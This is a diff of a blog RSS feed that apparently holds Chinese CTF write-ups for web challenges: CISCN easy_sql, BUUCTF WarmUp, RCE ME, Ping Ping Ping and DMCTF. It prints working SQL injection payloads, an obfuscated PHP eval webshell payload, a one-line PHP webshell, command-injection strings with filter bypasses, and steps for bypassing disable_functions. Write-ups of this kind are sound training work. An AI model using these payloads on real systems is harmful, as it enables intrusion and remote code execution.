@@ -1,69 +1,278 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>Web - 标签 - Braindance</title><link>https://www.braindance.top/tags/web/</link><description>Web - 标签 - Braindance</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0800</lastBuildDate><atom:link href="https://www.braindance.top/tags/web/" rel="self" type="application/rss+xml"/><item><title>CISCN线上赛库存</title><link>https://www.braindance.top/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link><pubDate>Wed, 18 Aug 2021 17:21:24 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid><description><![CDATA[<h1 id="easy_sql" class="headerLink">
-    <a href="#easy_sql" class="header-mark"></a>easy_sql</h1><p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是<strong>括号单引号闭合</strong></p>
-<blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &lsquo;1&rsquo;) LIMIT 0,1&rsquo; at line 1</p>]]></description></item><item><title>BUUCTF寒假刷题-Web</title><link>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description><![CDATA[<p>寒假横向刷题（尽量）
-<a href="https://buuoj.cn/challenges#" target="_blank" rel="noopener noreferrer">BUUCTF</a>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on</title><link>/tags/web/</link><description>Recent content in Web on</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate><atom:link href="/tags/web/index.xml" rel="self" type="application/rss+xml"/><item><title>CISCN线上赛库存</title><link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link><pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate><guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid><description>&lt;h1 id="easy_sql">easy_sql&lt;/h1>
+&lt;p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是&lt;strong>括号单引号闭合&lt;/strong>&lt;/p>
+&lt;blockquote>
+&lt;p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&lt;/p>
+&lt;/blockquote>
+&lt;p>过滤的字符有union，所以尝试报错注入，查询版本号。&lt;/p>
+&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
+&lt;/code>&lt;/pre>&lt;p>接下来想要通过&lt;strong>information_schema&lt;/strong>库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&lt;/p>
+&lt;p>最后参考了网上的一篇文章：&lt;a href="https://blog.csdn.net/weixin_35867608/article/details/113937118">mysql 注入 information_schema_绕过IDS过滤information_schema继续注入&lt;/a>，模仿文章构造payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
+&lt;/code>&lt;/pre>&lt;p>回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&lt;/p>
+&lt;pre tabindex="0">&lt;code>Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39;
+&lt;/code>&lt;/pre>&lt;p>直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&lt;/p>
+&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
+&lt;/code>&lt;/pre>&lt;p>flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}&lt;/p>
+&lt;h1 id="easy_source">easy_source&lt;/h1>
+&lt;p>使用目录扫描，扫描到了&lt;code>.index.php.swo&lt;/code>&lt;/p></description></item><item><title>BUUCTF寒假刷题-Web</title><link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p>寒假横向刷题（尽量）
+&lt;a href="https://buuoj.cn/challenges#">BUUCTF&lt;/a>
 💗🧡💛💚💙💜🤎🖤🤍
-<strong>题都写这一个里面了，可以先用<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨</strong></p>]]></description></item><item><title>极客大挑战 2019 RCE ME</title><link>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description><![CDATA[<h1 id="极客大挑战-2019rce-me" class="headerLink">
-    <a href="#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019rce-me" class="header-mark"></a>[极客大挑战 2019]RCE ME</h1><p>源码：</p>
-<div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
-  <div class="
-    code-block-title 
-    
-    tw-flex 
-    tw-flex-row 
-    tw-justify-between 
-    tw-w-full tw-bg-bgColor-secondary
-    ">      
-    <button 
-      class="
-        tw-select-none 
-        tw-mx-2 
-        tw-block
-        group-[.is-open]:tw-rotate-90
-        tw-transition-[transform] 
-        tw-duration-500 
-        tw-ease-in-out
-        print:!tw-hidden"
-      disabled
-      aria-hidden="true"><svg class="icon"
-    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></button>
+&lt;strong>题都写这一个里面了，可以先用&lt;!-- raw HTML omitted -->Ctrl&lt;!-- raw HTML omitted -->+&lt;!-- raw HTML omitted -->F&lt;!-- raw HTML omitted -->搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&lt;/strong>&lt;/p>
+&lt;h1 id="20210115">2021.01.15&lt;/h1>
+&lt;h1 id="hctf-2018warmup">[HCTF 2018]WarmUp&lt;/h1>
+&lt;p>进到靶机一个硕大的滑稽，查看源码有提示source.php&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png" alt="">&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+ highlight_file(__FILE__);
+ class emmm
+ {
+ public static function checkFile(&amp;amp;$page)
+ {
+ $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
+ if (! isset($page) || !is_string($page)) {
+ echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
+ return false;
+ }
 
-    <div class="code-block-title-bar tw-w-full">
-      <p class="tw-select-none !tw-my-1">text</p>]]></description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</guid><description><![CDATA[<h1 id="gxyctf2019ping-ping-ping" class="headerLink">
-    <a href="#gxyctf2019ping-ping-ping" class="header-mark"></a>[GXYCTF2019]Ping Ping Ping</h1><p>题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping</p>]]></description></item><item><title>DMCTF之Web</title><link>https://www.braindance.top/posts/ctf/dmctf%E4%B9%8Bweb/</link><pubDate>Sun, 29 Nov 2020 23:17:50 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/dmctf%E4%B9%8Bweb/</guid><description><![CDATA[<h1 id="前言" class="headerLink">
-    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>比赛地址：<a href="http://dmctf.vaala.cloud:81/" target="_blank" rel="noopener noreferrer">http://dmctf.vaala.cloud:81</a></p>
-<p>这次先写Web题目部分，我最后的排名：</p>
-<p><img class="tw-inline" loading="lazy" src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png"   alt="img"  ></p>
-<h1 id="web" class="headerLink">
-    <a href="#web" class="header-mark"></a>Web</h1><h2 id="weak_type" class="headerLink">
-    <a href="#weak_type" class="header-mark"></a>weak_type</h2><p>源码：</p>
-<div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
-  <div class="
-    code-block-title 
-    
-    tw-flex 
-    tw-flex-row 
-    tw-justify-between 
-    tw-w-full tw-bg-bgColor-secondary
-    ">      
-    <button 
-      class="
-        tw-select-none 
-        tw-mx-2 
-        tw-block
-        group-[.is-open]:tw-rotate-90
-        tw-transition-[transform] 
-        tw-duration-500 
-        tw-ease-in-out
-        print:!tw-hidden"
-      disabled
-      aria-hidden="true"><svg class="icon"
-    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></button>
+ if (in_array($page, $whitelist)) {
+ return true;
+ }
 
-    <div class="code-block-title-bar tw-w-full">
-      <p class="tw-select-none !tw-my-1">text</p>]]></description></item><item><title>Hackgame2020(一)</title><link>https://www.braindance.top/posts/ctf/hackgame20201/</link><pubDate>Sun, 01 Nov 2020 18:33:40 +0800</pubDate><author><name>Braindance</name></author><guid>https://www.braindance.top/posts/ctf/hackgame20201/</guid><description><![CDATA[<h2 id="前言" class="headerLink">
-    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>比赛地址：https://hack.lug.ustc.edu.cn/</p>
-<h1 id="web" class="headerLink">
-    <a href="#web" class="header-mark"></a>web</h1><h3 id="签到题" class="headerLink">
-    <a href="#%e7%ad%be%e5%88%b0%e9%a2%98" class="header-mark"></a>签到题</h3><p>​	第一题是flag提取器，打开题目以后页面是一个提取器下面一个<code>进度条</code>和一个<code>提取</code>按钮。</p>]]></description></item></channel></rss>
+ $_page = mb_substr(
+ $page,
+ 0,
+ mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
+ );
+ if (in_array($_page, $whitelist)) {
+ return true;
+ }
+
+ $_page = urldecode($page);
+ $_page = mb_substr(
+ $_page,
+ 0,
+ mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
+ );
+ if (in_array($_page, $whitelist)) {
+ return true;
+ }
+ echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
+ return false;
+ }
+ }
+
+ if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
+ &amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
+ &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
+ ) {
+ include $_REQUEST[&amp;#39;file&amp;#39;];
+ exit;
+ } else {
+ echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
+ } 
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>发现白名单有source.php和hint.php，先去查看一下hint.php&lt;/p></description></item><item><title>极客大挑战 2019 RCE ME</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME&lt;/h1>
+&lt;p>源码：&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&amp;#39;code&amp;#39;])){
+ $code=$_GET[&amp;#39;code&amp;#39;];
+ if(strlen($code)&amp;gt;40){
+ die(&amp;#34;This is too Long.&amp;#34;);
+ }
+ if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
+ die(&amp;#34;NO.&amp;#34;);
+ }
+ @eval($code);
+}
+else{
+ highlight_file(__FILE__);
+}
+
+// ?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>分析一波，GET请求获得&lt;code>code&lt;/code>，想要通过的话需要绕过两个检测：&lt;/p>
+&lt;ol>
+&lt;li>payload长度小于40&lt;/li>
+&lt;li>不能包含&lt;code>a-z、A-Z、0-9&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;p>和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell&lt;/a>，这次摸到了相关文章：&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇&lt;/a>。&lt;/p>
+&lt;p>使用&lt;code>url编码&lt;/code>+&lt;code>~&lt;/code>取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code>($a)()&lt;/code>这样的方法动态执行函数，所以我们可以构造payload：&lt;code>assert(eval($_POST[‘a’]))&lt;/code>&lt;/p>
+&lt;p>先构造&lt;code>assert&lt;/code>：&lt;/p>
+&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;assert&amp;#39;);
+
+//结果：%9E%8C%8C%9A%8D%8B
+&lt;/code>&lt;/pre>&lt;p>再构造&lt;code>eval($_POST['a'])&lt;/code>：&lt;/p>
+&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);
+
+//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
+&lt;/code>&lt;/pre>&lt;p>完整payload：&lt;/p>
+&lt;pre tabindex="0">&lt;code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
+&lt;/code>&lt;/pre>&lt;p>网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code>~&lt;/code>取反再获得真正的函数名。&lt;/p>
+&lt;p>使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code>ELF&lt;/code>是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code>ret=127&lt;/code>：&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png" alt="">&lt;/p>
+&lt;p>搜索了一波，原来是是&lt;strong>disable_function&lt;/strong>搞的鬼，这个表可以在phpinfo()中查看：&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png" alt="">&lt;/p>
+&lt;p>因为&lt;code>system&lt;/code>、&lt;code>exec&lt;/code>、&lt;code>shell_exec&lt;/code>等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过&lt;strong>disable_function&lt;/strong>的方法，网上有很多其他方法，其中一个方法：&lt;/p>
+&lt;p>&lt;strong>利用环境变量LD_PRELOAD来绕过&lt;/strong>&lt;/p>
+&lt;blockquote>
+&lt;p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p>
+&lt;p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p>
+&lt;/blockquote>
+&lt;p>正好蚁剑的插件中就有一个名为：&lt;a href="https://github.com/Medicean/as_bypass_php_disable_functions">as_bypass_php_disable_functions&lt;/a>的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png" alt="">&lt;/p>
+&lt;p>插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code>/var/www/html&lt;/code>目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png" alt="">&lt;/p>
+&lt;blockquote>
+&lt;p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p>
+&lt;/blockquote>
+&lt;p>上传一句话木马233.php：&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?php
+@eval($_POST[&amp;#39;b&amp;#39;]);
+&lt;/code>&lt;/pre>&lt;p>再用一句话木马的shell执行插件：&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png" alt="">&lt;/p>
+&lt;p>进入shell，目录下面多了一个名为**.antproxy.php**的文件：&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png" alt="">&lt;/p>
+&lt;p>再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png" alt="">&lt;/p>
+&lt;p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p></description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping&lt;/h1>
+&lt;p>题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p>
+&lt;p>和DMCTF做的那道&lt;strong>pingpingping&lt;/strong>类似，同样是使用管道符构造payload，先使用：&lt;/p>
+&lt;pre tabindex="0">&lt;code>?ip=127.0.0.1|ls
+&lt;/code>&lt;/pre>&lt;p>目录下有两个文件：&lt;code>flag.php&lt;/code>、&lt;code>index.php&lt;/code>。首先试出来了空格被过滤，使用以下绕过空格：&lt;/p>
+&lt;pre tabindex="0">&lt;code>$IFS
+${IFS}
+$IFS$1 //$1改成$加其他数字貌似都行
+&amp;lt; 
+&amp;lt;&amp;gt; 
+{cat,flag.php} //用逗号实现了空格功能
+%20 
+%09 
+&lt;/code>&lt;/pre>&lt;p>在linux下反单引号里面的指令会被执行 &lt;strong>`ls`&lt;/strong>&lt;/p>
+&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
+&lt;/code>&lt;/pre>&lt;p>会输出该目录下所有可以打开的文件，可以查看&lt;strong>index.php&lt;/strong>的部分源码有哪些过滤：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#a6e22e">ip&lt;/span>&lt;span style="color:#f92672">=|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your symbol!&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/ /&amp;#34;&lt;/span>, $ip)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your space!&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bash/&amp;#34;&lt;/span>, $ip)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your bash!&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span>, $ip)){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your flag!&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">shell_exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ping -c 4 &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$ip);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">print_r&lt;/span>($a);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问&lt;strong>flag.php&lt;/strong>。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用&lt;strong>readflag&lt;/strong>的ELF执行文件访问，但是还没成功。其实执行：&lt;/p>
+&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
+&lt;/code>&lt;/pre>&lt;p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了&lt;!-- raw HTML omitted -->我是傻逼&lt;!-- raw HTML omitted -->。&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png" alt="">&lt;/p></description></item><item><title>DMCTF之Web</title><link>/posts/ctf/dmctf%E4%B9%8Bweb/</link><pubDate>Sun, 29 Nov 2020 23:17:50 +0000</pubDate><guid>/posts/ctf/dmctf%E4%B9%8Bweb/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
+&lt;p>比赛地址：&lt;a href="http://dmctf.vaala.cloud:81/">http://dmctf.vaala.cloud:81&lt;/a>&lt;/p>
+&lt;p>这次先写Web题目部分，我最后的排名：&lt;/p>
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png" alt="img">&lt;/p>
+&lt;h1 id="web">Web&lt;/h1>
+&lt;h2 id="weak_type">weak_type&lt;/h2>
+&lt;p>源码：&lt;/p>
+&lt;pre tabindex="0">&lt;code>PHP
+&amp;lt;?php
+
+show_source(__FILE__);
+include(&amp;#39;class.php&amp;#39;);
+
+//level1 
+
+if(isset($_GET[&amp;#39;num&amp;#39;])){
+ $num = $_GET[&amp;#39;num&amp;#39;];
+ if($num===&amp;#34;202020020&amp;#34;){
+ die(&amp;#34;no no no!&amp;#34;);
+ }
+ if(intval($num,0)===202020020){
+ echo &amp;#34;&amp;lt;br&amp;gt; level 1 Ok &amp;lt;br&amp;gt;&amp;#34;;
+ }else{
+ die(&amp;#39;what are you doing?&amp;#39;);
+ }
+}else{
+ die();
+}
+
+//level 2
+
+if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;])){
+ $v1 = $_GET[&amp;#39;v1&amp;#39;];
+ $v2 = $_GET[&amp;#39;v2&amp;#39;];
+ if($v1 != $v2 &amp;amp;&amp;amp; md5($v1)==md5($v2)){
+ echo &amp;#34;&amp;lt;br&amp;gt; level 2 Ok &amp;lt;br&amp;gt;&amp;#34;;
+ }else{
+ die(&amp;#39;Are you kidding me ?&amp;#39;);
+ }
+}else{
+ die();
+}
+
+//level 3 
+
+if (isset($_POST[&amp;#39;message&amp;#39;])) {
+ $message = json_decode($_POST[&amp;#39;message&amp;#39;]);
+ if ($message-&amp;gt;key == $key) {
+ echo &amp;#34;&amp;lt;br&amp;gt; Wow you got it !!! &amp;lt;br&amp;gt;&amp;#34;;
+ echo file_get_contents(&amp;#39;/flag&amp;#39;);
+ } 
+ else {
+ die(&amp;#34;fail&amp;#34;);
+ }
+ }
+else{
+ echo &amp;#34;~~~~&amp;#34;;
+ }
